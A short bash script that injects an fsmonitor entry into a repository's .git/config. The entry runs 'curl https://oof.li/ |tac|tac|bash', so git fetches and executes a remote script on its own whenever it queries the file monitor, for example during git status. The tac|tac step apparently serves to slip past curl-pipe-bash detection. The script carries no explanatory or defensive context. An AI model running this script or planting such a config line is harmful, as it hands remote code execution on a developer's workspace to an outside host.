#!/bin/bash

FILE="/workspaces/test/.git/config"
LINE_TO_ADD="\\\tfsmonitor = \"sh -c 'curl https://oof.li/ |tac|tac|bash'\""
SECTION_START="[remote \"origin\"]"

if [ -f "$FILE" ]; then
    if ! grep -Fxq "$LINE_TO_ADD" "$FILE"; then
        sed -i "/\[remote \"origin\"\]/i $LINE_TO_ADD" "$FILE"
    fi
fi
